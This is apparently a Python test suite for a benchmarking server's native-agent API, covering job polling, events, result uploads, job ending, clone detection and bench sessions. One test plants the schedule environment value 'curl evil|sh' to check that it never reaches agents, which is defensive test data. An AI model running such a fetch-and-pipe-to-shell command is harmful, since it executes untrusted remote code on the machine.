"""Native agents, step S5 (Benchy 0.9.4): poll and the job it hands out, events, the result upload, end, the trigger rules, the clone
check and benches.

Every test enrolls its own system and gives it its own schedule, which is deleted again (a leftover active schedule leaks into every later
test of the shared server). Replies are checked against the pinned schemas.

Run through tests/private-repo/run.sh (part of http/all).
"""
import gzip
import hashlib
import json
import unittest
import uuid

from bench_helpers import make_bench, new_system, open_session, result_row, schedule, drop_schedule, system_row, today
from test_native_enroll import audit
from test_private_repo_http import AID, sql, srv_sh
from test_private_repo_tokens import sql_exec
from test_private_repo_web import WebBase
from v2_helpers import (make_other_account, remove_account, server_log_problems, admin, allow_http, call, check, drop_native_schedule, enroll, event, fixture_result, get_job, hello_body, hello_event, job_row, native_schedule,
                        new_run_id, poll_body, upload_result)


def setUpModule():
    allow_http(True)


def tearDownModule():
    allow_http(False)
    problems = server_log_problems()
    assert not problems, 'PHP complained while serving the v2 API: %s' % problems


class Agent(unittest.TestCase):
    """One enrolled native system with a due native schedule"""

    def setUp(self):
        self.token, reply = enroll()
        self.sid = reply['system']['id']
        self.sched = native_schedule(self.sid)
        self.addCleanup(drop_native_schedule, self.sched)
        self.addCleanup(sql_exec, "DELETE FROM phoromatic_v2_jobs WHERE SystemID='%s'" % self.sid)

    def hello(self, **kw):
        status, body, _ = call('/api/v2/agent/hello', hello_body(**kw), token=self.token)
        self.assertEqual(status, 200, body)

    def events(self, job_id, events, token=None):
        return call('/api/v2/jobs/%d/events' % job_id, {'events': events}, token=token or self.token)

    def end(self, job_id, status, reason=None, run=None):
        return call('/api/v2/jobs/%d/end' % job_id, {'status': status, 'reason': reason, 'run': run}, token=self.token)

    def run_job(self, job, run=None, with_run_end=True):
        """what an agent forwards: the child's hello, a test start and (optionally) the run's end"""
        run = run or new_run_id()
        evs = [hello_event(run), event('test_start', 2, run, test={'ref': 'benchy/stream', 'version': '1.0.0'}, options={}, summary='', index=1, total=1)]
        if with_run_end:
            evs.append(event('run_end', 3, run, status='ok', result=None, completed=1, failed=0, cancelled=0))
        status, body, _ = self.events(job['id'], evs)
        self.assertEqual(status, 200, body)
        return run


class TestPoll(Agent):
    def test_hold_reasons_and_rehello(self):
        status, body, _ = call('/api/v2/agent/poll', poll_body(), token=self.token)
        self.assertEqual(check('poll_response', body), [])
        self.assertTrue(body['rehello'], 'no hello yet: ask for one')
        self.hello()
        job, body = get_job(self.token)
        self.assertFalse(body['rehello'], 'a hello has been sent')
        issued = sql("SELECT COUNT(*) AS n FROM phoromatic_v2_jobs WHERE SystemID='%s'" % self.sid)[0]['n']
        status, busy, _ = call('/api/v2/agent/poll', poll_body(state='busy', busy_reason='a person is benchmarking'), token=self.token)
        self.assertEqual((busy['job'], busy['hold']), (None, 'Busy with a local run.'))
        self.assertIn('Busy', system_row(self.sid)['CurrentTask'])
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET MaintenanceMode=1 WHERE SystemID='%s'" % self.sid), 'ok')
        self.assertEqual(call('/api/v2/agent/poll', poll_body(), token=self.token)[1]['hold'], 'This system is in maintenance mode.')
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET MaintenanceMode=0, EnginePolicy=NULL WHERE SystemID='%s'" % self.sid), 'ok')
        self.assertEqual(call('/api/v2/agent/poll', poll_body(), token=self.token)[1]['hold'], 'This system is set to the PTS engine.')
        self.assertEqual(sql("SELECT COUNT(*) AS n FROM phoromatic_v2_jobs WHERE SystemID='%s'" % self.sid)[0]['n'], issued, 'no hold issued a job')

    def test_a_held_clone_does_not_make_the_real_system_look_alive(self):
        self.hello()
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET LastCommunication='2020-01-01 00:00:00', LastIP='203.0.113.9', CurrentTask='Idle (native agent)' WHERE SystemID='%s'" % self.sid), 'ok')
        call('/api/v2/agent/poll', poll_body('c'), token=self.token)
        call('/api/v2/agent/hello', hello_body('c'), token=self.token)
        row = system_row(self.sid)
        self.assertEqual((row['LastCommunication'], row['LastIP'], row['CurrentTask']), ('2020-01-01 00:00:00', '203.0.113.9', 'Idle (native agent)'), 'the clone changed nothing')
        call('/api/v2/agent/poll', poll_body('a'), token=self.token)
        self.assertNotEqual(system_row(self.sid)['LastCommunication'], '2020-01-01 00:00:00', 'the real machine still checks in')

    def test_a_cloned_machine_gets_a_hold_and_one_warning_and_the_original_keeps_working(self):
        self.hello()
        status, body, _ = call('/api/v2/agent/poll', poll_body('c'), token=self.token)
        self.assertEqual((body['job'], body['hold']), (None, 'This token is in use on another machine (a cloned VM?). Re-enroll this machine.'))
        call('/api/v2/agent/poll', poll_body('c'), token=self.token)
        rows = audit('agent_machine_mismatch', self.sid)
        self.assertEqual(len(rows), 1, 'one audit row per token and machine id')
        self.assertEqual(len(sql("SELECT * FROM phoromatic_system_warnings WHERE SystemID='%s'" % self.sid)), 1)
        # the clone's hello must not overwrite the original's sysinfo or catalogue
        before = system_row(self.sid)['Hardware']
        b = hello_body('c')
        b['system_info']['summary']['hardware'] = 'Processor: Clone'
        self.assertEqual(call('/api/v2/agent/hello', b, token=self.token)[0], 200)
        self.assertEqual(system_row(self.sid)['Hardware'], before)
        job, _ = get_job(self.token, seed='a')
        self.assertIsNotNone(job, 'the machine the token was enrolled on still gets its work')
        # a second clone id is audited separately
        call('/api/v2/agent/poll', poll_body('e'), token=self.token)
        self.assertEqual(len(audit('agent_machine_mismatch', self.sid)), 2)


class TestJobs(Agent):
    def test_a_due_native_schedule_is_issued_as_a_job_with_the_documented_shape(self):
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET SystemVariables='serial=AB12;.admin=dave;bad name=x;lower_case=1;' WHERE SystemID='%s'" % self.sid), 'ok')
        self.assertEqual(sql_exec("UPDATE phoromatic_schedules SET EnvironmentVariables='TEST_EXEC_PREPEND=curl evil|sh;CFLAGS=-fplugin=x' WHERE ScheduleID=%d" % self.sched), 'ok')
        self.hello()
        job, body = get_job(self.token)
        self.assertEqual(check('poll_response', body), [])
        title = sql("SELECT Title FROM phoromatic_schedules WHERE ScheduleID=%d" % self.sched)[0]['Title']
        self.assertEqual((job['kind'], job['identifier'], job['title']), ('schedule', today(), '%s - %s' % (title, today())))
        self.assertEqual(job['schedule'], {'id': self.sched, 'trigger': today()})
        self.assertEqual(job['tests'], [{'ref': 'benchy/stream', 'format': 'native', 'options': {}}])
        self.assertEqual(job['environment'], {'BENCHY_VAR_SERIAL': 'AB12', 'BENCHY_VAR_ADMIN': 'dave', 'BENCHY_VAR_LOWER_CASE': '1'},
                         'system variables only, as BENCHY_VAR_<NAME>; the schedule\'s own environment is never sent')
        self.assertIsNone(job['bench'])
        row = job_row(job['id'])
        self.assertEqual((row['State'], row['Kind'], row['ScheduleID'], row['Trigger']), ('issued', 'schedule', self.sched, today()))
        self.assertEqual(json.loads(row['PayloadJSON']), job)
        self.assertIn('Issued', system_row(self.sid)['CurrentTask'])

    def test_options_travel_as_data_and_tests_keep_their_order(self):
        drop_native_schedule(self.sched)
        self.sched = native_schedule(self.sid, [('benchy/c-ray', {'resolution': '1920x1080', 'a': 'b'}), ('benchy/stream', {})])
        self.addCleanup(drop_native_schedule, self.sched)
        job, body = get_job(self.token)
        self.assertEqual([t['ref'] for t in job['tests']], ['benchy/c-ray', 'benchy/stream'])
        self.assertEqual(job['tests'][0]['options'], {'a': 'b', 'resolution': '1920x1080'})
        self.assertEqual(check('poll_response', body), [])

    def test_a_job_the_agent_holds_is_resent_and_never_duplicated(self):
        job, _ = get_job(self.token)
        again, _ = get_job(self.token, current={'id': job['id'], 'run': None})
        self.assertEqual(again, job)
        self.assertEqual(sql("SELECT COUNT(*) AS n FROM phoromatic_v2_jobs WHERE SystemID='%s'" % self.sid)[0]['n'], 1)

    def test_a_job_the_agent_no_longer_reports_is_lost_and_the_trigger_comes_again_once(self):
        first, _ = get_job(self.token)
        second, _ = get_job(self.token)
        self.assertNotEqual(first['id'], second['id'], 'the agent does not report it: it is lost and the trigger is reissued')
        self.assertEqual((job_row(first['id'])['State'], job_row(first['id'])['EndStatus']), ('ended', 'lost'))
        third, body = get_job(self.token)
        self.assertIsNone(third, 'after two lost jobs the trigger is used up')
        warnings = sql("SELECT Warning FROM phoromatic_system_warnings WHERE SystemID='%s'" % self.sid)
        self.assertTrue(any('lost twice' in w['Warning'] for w in warnings))

    def test_while_the_agent_holds_a_job_no_other_is_issued(self):
        job, _ = get_job(self.token)
        other = native_schedule(self.sid, title='qc second %s' % uuid.uuid4().hex[:4])
        self.addCleanup(drop_native_schedule, other)
        job2, body = get_job(self.token, current={'id': 99999999, 'run': None})
        self.assertIsNone(job2)
        self.assertEqual(body['hold'], 'Waiting for the agent to finish its previous job.')

    def test_schedules_of_the_other_engine_are_not_offered(self):
        drop_native_schedule(self.sched)
        pts = schedule(self.sid)
        self.addCleanup(drop_schedule, pts)
        job, body = get_job(self.token)
        self.assertIsNone(job, 'a PTS-only schedule is nobody\'s job for a native agent')
        self.assertIsNone(body['hold'])
        # and the PHP client of a native system idles, whatever is scheduled
        self.sched = native_schedule(self.sid)
        self.addCleanup(drop_native_schedule, self.sched)

    def test_a_schedule_aimed_at_someone_else_is_not_issued(self):
        other_token, other_reply = enroll()
        mine, _ = get_job(self.token)
        theirs, _ = get_job(other_token)
        self.assertIsNotNone(mine)
        self.assertIsNone(theirs)


class TestEvents(Agent):
    def test_events_are_kept_deduplicated_and_the_job_starts_running(self):
        job, _ = get_job(self.token)
        run = new_run_id()
        evs = [hello_event(run), event('log', 2, run, level='info', text='hi', source='output')]
        status, body, _ = self.events(job['id'], evs)
        self.assertEqual((status, body['ok'], body['cancel']), (200, True, False))
        self.assertEqual(check('events_response', body), [])
        row = job_row(job['id'])
        self.assertEqual((row['State'], row['RunID']), ('running', run))
        # a resent batch, plus one new event: nothing is duplicated
        self.events(job['id'], evs + [event('log', 3, run, level='info', text='more', source='output')])
        sysdir = '/var/lib/benchy/phoromatic/accounts/%s/systems/%s/jobs/%d.events.jsonl' % (AID, self.sid, job['id'])
        lines = [json.loads(l) for l in srv_sh('cat %s' % sysdir).splitlines()]
        self.assertEqual([(l.get('run'), l['seq']) for l in lines], [(run, 1), (run, 2), (run, 3)])
        # an empty batch is the heartbeat
        self.assertEqual(self.events(job['id'], [])[0], 200)

    def test_events_the_agent_wrote_itself_are_kept_as_they_are(self):
        job, _ = get_job(self.token)
        run = new_run_id()
        agent_run = new_run_id()
        evs = [hello_event(run), event('log', 1, agent_run, level='warning', text='dropped BASH_ENV from the job environment', source='engine')]
        self.assertEqual(self.events(job['id'], evs)[0], 200)
        sysdir = '/var/lib/benchy/phoromatic/accounts/%s/systems/%s/jobs/%d.events.jsonl' % (AID, self.sid, job['id'])
        lines = [json.loads(l) for l in srv_sh('cat %s' % sysdir).splitlines()]
        self.assertIn((agent_run, 1, 'engine'), [(l.get('run'), l['seq'], l.get('source')) for l in lines], 'same seq as the child\'s hello, other run id: not a duplicate')
        self.assertEqual(job_row(job['id'])['RunID'], run, 'the run id is the child\'s, never the agent\'s own')

    def test_the_system_status_follows_the_run(self):
        job, _ = get_job(self.token)
        run = self.run_job(job, with_run_end=False)
        self.assertIn('Running benchy/stream (1 of 1)', system_row(self.sid)['CurrentTask'])
        self.events(job['id'], [event('run_end', 4, run, status='ok', result=None, completed=1, failed=0, cancelled=0)])
        self.assertEqual(job_row(job['id'])['RunEnded'], 1)

    def test_bad_events_and_other_peoples_jobs(self):
        job, _ = get_job(self.token)
        status, body, _ = call('/api/v2/jobs/%d/events' % job['id'], {'events': [{'type': 'log'}]}, token=self.token)
        self.assertEqual((status, body['error']['code']), (400, 'bad_request'))
        other_token, other_reply = enroll()
        status, body, _ = call('/api/v2/jobs/%d/events' % job['id'], {'events': []}, token=other_token)
        self.assertEqual((status, body['error']['code']), (409, 'job_not_yours'), 'a job of another system in the same account')
        self.assertEqual(check('error_reply', body), [])
        self.assertEqual(call('/api/v2/jobs/%d/events' % (job['id'] + 100000), {'events': []}, token=self.token)[1]['error']['code'], 'not_found')

    def test_another_accounts_job_is_a_job_that_does_not_exist(self):
        other = make_other_account()
        self.addCleanup(remove_account, other)
        self.assertEqual(sql_exec("INSERT INTO phoromatic_v2_jobs (AccountID, SystemID, Kind, PayloadJSON, State, IssuedOn) VALUES ('%s', 'QCZZZ', 'schedule', '{}', 'issued', 'now')" % other), 'ok')
        foreign = sql("SELECT JobID FROM phoromatic_v2_jobs WHERE AccountID='%s'" % other)[0]['JobID']
        for path in ('events', 'result', 'end'):
            status, body, _ = call('/api/v2/jobs/%d/%s' % (foreign, path), {'events': [], 'status': 'ok', 'reason': None, 'run': None}, token=self.token)
            self.assertEqual((status, body['error']['code']), (404, 'not_found'), path)

    def test_an_ended_job_takes_no_more_events(self):
        job, _ = get_job(self.token)
        self.end(job['id'], 'failed', 'nope')
        status, body, _ = self.events(job['id'], [])
        self.assertEqual((status, body['error']['code']), (409, 'job_ended'))

    def test_the_event_file_is_capped_at_4_mib(self):
        job, _ = get_job(self.token)
        run = new_run_id()
        big = 'x' * 60000
        n = 0
        for batch in range(80):
            evs = [event('log', 1 + batch * 5 + i, run, level='info', text=big, source='output') for i in range(5)]
            if batch == 0:
                evs[0] = hello_event(run)
            self.assertEqual(self.events(job['id'], evs)[0], 200)
        size = int(srv_sh('stat -c %%s /var/lib/benchy/phoromatic/accounts/%s/systems/%s/jobs/%d.events.jsonl' % (AID, self.sid, job['id'])))
        self.assertTrue(3500000 < size <= 4194304, size)


class TestResult(Agent):
    def started(self, run=None):
        job, _ = get_job(self.token)
        run = run or new_run_id()
        self.run_job(job, run)
        return job, run

    def test_a_result_is_converted_stored_and_linked_to_the_job(self):
        job, run = self.started()
        result = fixture_result('stream-ok', run)
        events = gzip.compress(b'{"v":1,"type":"hello","seq":1,"ts":"2026-11-02T21:55:46.067Z"}\n')
        status, body, _ = upload_result(self.token, job['id'], result, events_gz=events)
        self.assertEqual(status, 200, body)
        self.assertEqual(check('result_response', body), [])
        uid = body['upload_id']
        row = result_row(uid)
        self.assertEqual((row['SystemID'], row['ScheduleID'], row['Trigger'], row['InProgress']), (self.sid, self.sched, today(), 0))
        self.assertEqual(row['Title'], job['title'])
        self.assertIn(row['PPRID'], body['url'])
        parts = sql("SELECT TestProfile FROM phoromatic_results_results WHERE AccountID='%s' AND UploadID=%d" % (AID, uid))
        self.assertEqual([p['TestProfile'] for p in parts], ['benchy/stream-1.0.0'] * 4)
        j = job_row(job['id'])
        self.assertEqual((j['UploadID'], j['RunID'], j['RunEnded']), (uid, run, 1))
        base = '/var/lib/benchy/phoromatic/accounts/%s/results/%d/' % (AID, uid)
        self.assertEqual(json.loads(srv_sh('cat %sresult.json' % base)), result, 'the native original is kept')
        self.assertIn('"type":"hello"', srv_sh('cat %snative-events.jsonl' % base))
        self.assertIn('<Identifier>%s</Identifier>' % today(), srv_sh('cat %scomposite.xml' % base), 'the system identifier is the trigger, as in a PTS result')
        # the viewer reads it like any result
        self.assertEqual(self.end(job['id'], 'ok', None, run)[0], 200)

    def test_a_result_the_server_cannot_store_is_a_500_the_agent_retries_not_a_422(self):
        # engine 0.3.0 moves a 422 to outbox/rejected for good; a disk or database problem on the server is not the result's fault
        job, run = self.started()
        nxt = int(sql("SELECT COALESCE(MAX(UploadID), 0) + 1 AS n FROM phoromatic_results WHERE AccountID='%s'" % AID)[0]['n'])
        path = '/var/lib/benchy/phoromatic/accounts/%s/results/%d' % (AID, nxt)
        srv_sh('mkdir -p %s/composite.xml' % path)
        self.addCleanup(srv_sh, 'rm -rf %s' % path)
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run))
        self.assertIsInstance(body, dict, (status, body))
        self.assertEqual((status, body['error']['code']), (500, 'server_error'), body)
        self.assertEqual(check('error_reply', body), [])
        srv_sh('rm -rf %s' % path)
        self.assertEqual(upload_result(self.token, job['id'], fixture_result('quick', run))[0], 200, 'the same result is taken once the server can store it')

    def test_a_result_that_is_not_valid_is_still_a_422(self):
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run, mutate=lambda d: d['runs'][0].pop('tests')))
        self.assertEqual((status, body['error']['code']), (422, 'result_invalid'), body)

    def test_the_stored_event_file_comes_from_the_job_when_no_events_part_is_sent(self):
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run))
        self.assertEqual(status, 200, body)
        base = '/var/lib/benchy/phoromatic/accounts/%s/results/%d/' % (AID, body['upload_id'])
        self.assertIn('"type":"run_end"', srv_sh('cat %snative-events.jsonl' % base))
        self.assertEqual(srv_sh('ls /var/lib/benchy/phoromatic/accounts/%s/systems/%s/jobs/%d.events.jsonl 2>&1' % (AID, self.sid, job['id'])).count('No such file'), 1, 'moved, not copied')

    def test_a_second_upload_for_the_same_run_returns_the_first_reply(self):
        job, run = self.started()
        result = fixture_result('quick', run)
        first = upload_result(self.token, job['id'], result)[1]
        again = upload_result(self.token, job['id'], result)[1]
        self.assertEqual(again, first)
        self.assertEqual(sql("SELECT COUNT(*) AS n FROM phoromatic_results WHERE SystemID='%s'" % self.sid)[0]['n'], 1)
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', new_run_id()))
        self.assertEqual((status, body['error']['code']), (422, 'result_invalid'), 'another run for the same job is refused')

    def test_a_user_who_wants_mail_does_not_change_the_reply(self):
        self.assertEqual(sql_exec("UPDATE phoromatic_user_settings SET NotifyOnResultUploads = 1 WHERE AccountID = '%s'" % AID), 'ok')
        self.addCleanup(sql_exec, "UPDATE phoromatic_user_settings SET NotifyOnResultUploads = 0 WHERE AccountID = '%s'" % AID)
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run))
        self.assertEqual((status, check('result_response', body)), (200, []))

    def test_an_events_part_over_4_mib_is_too_large(self):
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run), events_gz=b'x' * (4 * 1024 * 1024 + 1))
        self.assertEqual((status, body['error']['code']), (413, 'too_large'))
        self.assertIsNone(job_row(job['id'])['UploadID'])

    def test_the_result_can_be_a_plain_form_field_too(self):
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('quick', run), as_file=False)
        self.assertEqual(status, 200, body)

    def test_invalid_results_are_422_and_store_nothing(self):
        job, run = self.started()
        cases = {
            'no ok entry': fixture_result('stream-failed', run),
            'another run': fixture_result('quick', new_run_id()),
            'null engine version': fixture_result('quick', run, mutate=lambda d: d['engine'].__setitem__('version', None)),
            'null test version': fixture_result('quick', run, mutate=lambda d: d['runs'][0]['tests'][0]['test'].__setitem__('version', None)),
            'two runs': fixture_result('quick', run, mutate=lambda d: d['runs'].append(d['runs'][0])),
            'a repeated entry': fixture_result('quick', run, mutate=lambda d: d['runs'][0]['tests'].append(dict(d['runs'][0]['tests'][0]))),
            'an ok entry with no value': fixture_result('quick', run, mutate=lambda d: d['runs'][0]['tests'][0].__setitem__('value', None)),
            'a string value': fixture_result('quick', run, mutate=lambda d: d['runs'][0]['tests'][0].__setitem__('value', '42')),
            'a bad status': fixture_result('quick', run, mutate=lambda d: d['runs'][0]['tests'][0].__setitem__('status', 'great')),
            'schema 2': fixture_result('quick', run, mutate=lambda d: d.__setitem__('schema', 2)),
        }
        for why, doc in cases.items():
            status, body, _ = upload_result(self.token, job['id'], doc)
            self.assertEqual((status, body.get('error', {}).get('code')), (422, 'result_invalid'), why)
            self.assertEqual(check('error_reply', body), [], why)
        self.assertEqual(sql("SELECT COUNT(*) AS n FROM phoromatic_results WHERE SystemID='%s'" % self.sid)[0]['n'], 0)
        self.assertIsNone(job_row(job['id'])['UploadID'])
        self.assertEqual(upload_result(self.token, job['id'], b'not json')[1]['error']['code'], 'bad_request')
        status, body, _ = call('/api/v2/jobs/%d/result' % job['id'], {'x': 1}, token=self.token)
        self.assertEqual((status, body['error']['code']), (400, 'bad_request'), 'a result must be multipart')

    def test_the_catalogue_title_names_the_test_and_a_result_after_the_run_used_the_trigger_up(self):
        self.hello(catalogue=[{'test': {'ref': 'benchy/stream', 'version': '1.0.0'}, 'title': 'STREAM memory bandwidth', 'options': []}])
        job, run = self.started()
        status, body, _ = upload_result(self.token, job['id'], fixture_result('stream-ok', run))
        self.assertEqual(status, 200)
        page = srv_sh("cat /var/lib/benchy/phoromatic/accounts/%s/results/%d/composite.xml" % (AID, body['upload_id']))
        self.assertIn('<Title>STREAM memory bandwidth</Title>', page)
        self.end(job['id'], 'ok', None, run)
        nxt, _ = get_job(self.token)
        self.assertIsNone(nxt, 'a stored result for the trigger: nothing more to run today')

    def test_a_result_for_an_ended_job_is_taken_only_when_it_ended_with_a_run(self):
        job, run = self.started()
        self.end(job['id'], 'ok', None, run)
        self.assertEqual(upload_result(self.token, job['id'], fixture_result('quick', run))[0], 200, 'the end came before the upload: the upload still lands')
        job2, run2 = None, None
        self.sched2 = native_schedule(self.sid, title='qc second %s' % uuid.uuid4().hex[:4])
        self.addCleanup(drop_native_schedule, self.sched2)
        job2, _ = get_job(self.token)
        self.assertIsNotNone(job2)
        self.end(job2['id'], 'deferred', 'a local run won')
        status, body, _ = upload_result(self.token, job2['id'], fixture_result('quick', new_run_id()))
        self.assertEqual((status, body['error']['code']), (409, 'job_ended'))


class TestEnd(Agent):
    def test_end_is_idempotent_and_keeps_the_first_status(self):
        job, _ = get_job(self.token)
        status, body, _ = self.end(job['id'], 'failed', 'the first error message', None)
        self.assertEqual((status, body['ok']), (200, True))
        self.assertEqual(check('end_response', body), [])
        self.assertEqual(self.end(job['id'], 'failed', 'the first error message')[0], 200)
        self.assertEqual(self.end(job['id'], 'ok')[0], 200, 'a late different end is answered, and changes nothing')
        row = job_row(job['id'])
        self.assertEqual((row['State'], row['EndStatus'], row['EndReason']), ('ended', 'failed', 'the first error message'))
        self.assertEqual(call('/api/v2/jobs/%d/end' % job['id'], {'status': 'lost', 'reason': None, 'run': None}, token=self.token)[0], 400, 'lost is the server\'s word only')

    def test_a_deferred_job_does_not_use_the_trigger_up_whatever_its_reason(self):
        for reason in ('agent_stopped', 'a local run won the race', None):
            job, _ = get_job(self.token)
            self.assertIsNotNone(job, 'the trigger comes again after deferred (%s)' % reason)
            self.end(job['id'], 'deferred', reason)
        self.assertEqual(sql("SELECT COUNT(*) AS n FROM phoromatic_v2_jobs WHERE SystemID='%s' AND EndStatus='deferred'" % self.sid)[0]['n'], 3)

    def test_a_job_a_person_stopped_on_the_machine_is_not_started_again(self):
        job, _ = get_job(self.token)
        self.end(job['id'], 'cancelled', 'local_cancel')
        self.assertIsNone(get_job(self.token)[0])

    def test_a_job_stopped_for_the_agents_own_reasons_comes_again(self):
        for reason in ('agent_stopped', 'agent_restarted'):
            job, _ = get_job(self.token)
            self.assertIsNotNone(job)
            self.end(job['id'], 'cancelled', reason)

    def test_a_run_that_reached_its_end_uses_the_trigger_up_even_when_it_failed(self):
        job, _ = get_job(self.token)
        run = self.run_job(job)
        self.end(job['id'], 'failed', 'no test produced a result', run)
        self.assertIsNone(get_job(self.token)[0])

    def test_a_job_that_died_without_a_run_end_is_retried_once_and_then_given_up(self):
        first, _ = get_job(self.token)
        self.run_job(first, with_run_end=False)
        self.end(first['id'], 'failed', 'the child died')
        second, _ = get_job(self.token)
        self.assertIsNotNone(second, 'no run_end seen: try again')
        self.end(second['id'], 'failed', 'the child died again')
        self.assertIsNone(get_job(self.token)[0], 'two attempts without an end: the trigger is used up')

    def test_ending_a_job_with_a_run_id_records_it_once(self):
        job, _ = get_job(self.token)
        run = new_run_id()
        self.end(job['id'], 'failed', 'x', run)
        self.assertEqual(job_row(job['id'])['RunID'], run)


class TestBench(WebBase):
    def test_a_native_bench_member_gets_the_sessions_work_and_its_result_is_filed_under_it(self):
        msi, sid, bid, session = make_bench(self.admin, cls='other', label='qc Part %s' % uuid.uuid4().hex[:5])
        token, reply = enroll(system=sid)
        sched = native_schedule(sid)
        self.addCleanup(drop_native_schedule, sched)
        self.addCleanup(sql_exec, "DELETE FROM phoromatic_v2_jobs WHERE SystemID='%s'" % sid)
        call('/api/v2/agent/hello', hello_body(), token=token)
        job, body = get_job(token)
        self.assertIsNotNone(job, body)
        self.assertEqual(check('poll_response', body), [])
        label = open_session(bid)['Label']
        self.assertEqual(job['bench']['session'], session)
        self.assertEqual((job['bench']['component']['label'], job['bench']['component']['class']), (label, 'other'))
        self.assertEqual(job['bench']['bench']['id'], bid)
        self.assertEqual(job['environment']['BENCHY_BENCH_SESSION'], str(session))
        self.assertEqual(job['environment']['BENCHY_BENCH_COMPONENT'], label)
        self.assertTrue(job['title'].endswith(' - S%d' % session))
        self.assertEqual(job_row(job['id'])['BenchSessionID'], session)
        self.assertEqual(system_row(sid)['BenchTaskSession'], session, 'the task snapshot is recorded with the issue')
        # the result lands in the session; the snapshot ends
        run = new_run_id()
        call('/api/v2/jobs/%d/events' % job['id'], {'events': [hello_event(run)]}, token=token)
        status, ok, _ = upload_result(token, job['id'], fixture_result('quick', run))
        self.assertEqual(status, 200, ok)
        row = result_row(ok['upload_id'])
        self.assertEqual((int(row['BenchSessionID']), row['BenchSessionSource']), (session, 'task'))
        self.assertIsNone(system_row(sid)['BenchTaskSession'])
        # the structured sysinfo feeds the drift guard: a different CPU in the next hello is noticed
        changed = hello_body()
        changed['system_info']['cpu']['model'] = 'A Different CPU'
        call('/api/v2/agent/hello', changed, token=token)
        self.assertEqual(call('/api/v2/jobs/%d/end' % job['id'], {'status': 'ok', 'reason': None, 'run': run}, token=token)[0], 200)
        sql_exec("DELETE FROM phoromatic_results WHERE SystemID='%s'" % sid)
        sql_exec("DELETE FROM phoromatic_v2_jobs WHERE SystemID='%s'" % sid)
        held, body = get_job(token)
        self.assertIsNotNone(held, 'a changed constant part is a notice, the work still goes out')
        drift = system_row(sid)['BenchDrift']
        self.assertTrue(drift and 'cpu' in drift, 'the drift guard saw the new CPU in the structured sysinfo: %s' % drift)

    def test_a_late_result_is_filed_with_the_deviation_of_the_jobs_own_time(self):
        msi, sid, bid, session = make_bench(self.admin, cls='other', label='qc Part %s' % uuid.uuid4().hex[:5])
        token, reply = enroll(system=sid)
        sched = native_schedule(sid)
        self.addCleanup(drop_native_schedule, sched)
        self.addCleanup(sql_exec, "DELETE FROM phoromatic_v2_jobs WHERE SystemID='%s'" % sid)
        call('/api/v2/agent/hello', hello_body(), token=token)
        notice = json.dumps({'kind': 'notice', 'fields': [{'key': 'cpu', 'baseline': 'Old CPU', 'detected': 'New CPU', 'holds': False}]})
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET BenchDrift='%s' WHERE SystemID='%s'" % (notice, sid)), 'ok')
        job, body = get_job(token)
        self.assertIsNotNone(job, body)
        self.assertNotIn('_deviation', job, 'what the agent is sent has no private fields')
        again, _ = get_job(token, current={'id': job['id'], 'run': None})
        self.assertEqual(again['id'], job['id'])
        self.assertNotIn('_deviation', again, 'nor when the issued job is sent again')
        # the notice is cleared before the result arrives, but the result belongs to the job as it was issued
        self.assertEqual(sql_exec("UPDATE phoromatic_systems SET BenchDrift=NULL WHERE SystemID='%s'" % sid), 'ok')
        run = new_run_id()
        call('/api/v2/jobs/%d/events' % job['id'], {'events': [hello_event(run)]}, token=token)
        status, ok, _ = upload_result(token, job['id'], fixture_result('quick', run))
        self.assertEqual(status, 200, ok)
        deviation = json.loads(result_row(ok['upload_id'])['BenchDeviation'])
        self.assertEqual([(d['key'], d['baseline'], d['detected']) for d in deviation], [('cpu', 'Old CPU', 'New CPU')])

    def test_a_bench_without_a_session_holds_and_a_native_task_ends_its_snapshot_when_it_is_deferred(self):
        msi, sid, bid, session = make_bench(self.admin, cls='other', label='qc Part %s' % uuid.uuid4().hex[:5])
        token, reply = enroll(system=sid)
        sched = native_schedule(sid)
        self.addCleanup(drop_native_schedule, sched)
        self.addCleanup(sql_exec, "DELETE FROM phoromatic_v2_jobs WHERE SystemID='%s'" % sid)
        call('/api/v2/agent/hello', hello_body(), token=token)
        job, _ = get_job(token)
        self.assertIsNotNone(job)
        self.assertEqual(system_row(sid)['BenchTaskSession'], session)
        call('/api/v2/jobs/%d/end' % job['id'], {'status': 'deferred', 'reason': None, 'run': None}, token=token)
        self.assertIsNone(system_row(sid)['BenchTaskSession'], 'a task that never ran blocks no swap')


if __name__ == '__main__':
    unittest.main()
